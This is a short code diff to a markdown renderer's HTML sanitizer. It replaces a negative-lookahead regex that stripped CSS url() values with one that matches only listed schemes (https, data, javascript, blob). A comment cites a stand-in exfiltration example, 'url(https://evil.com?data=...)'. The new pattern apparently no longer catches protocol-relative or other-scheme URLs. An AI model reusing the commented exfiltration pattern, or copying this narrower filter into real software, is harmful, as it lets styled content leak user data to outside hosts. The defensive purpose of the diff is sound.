@@ -651,8 +651,11 @@ export async function renderMarkdown() {
                         // Allows: fill: url(#gradient); (local fragment references for SVG)
                         // Blocks: background: url(https://evil.com?data=...);
                         // Blocks: background: url(data:text/html,...);
-                        // The negative lookahead (?!['"]?#) preserves url(#...) patterns
-                        fo.innerHTML = sanitizedHtml.replace(/url\s*\(\s*(?!['"]?#)[^)]*\)/gi, '');
+                        // Explicitly match dangerous schemes to avoid ReDoS from negative lookahead
+                        fo.innerHTML = sanitizedHtml.replace(
+                            /url\s*\(\s*['"]?(https?:|data:|javascript:|blob:)[^)]*\)/gi,
+                            ''
+                        );
                     }
                     // Clean up the marker attribute
                     fo.removeAttribute('data-fo-idx');
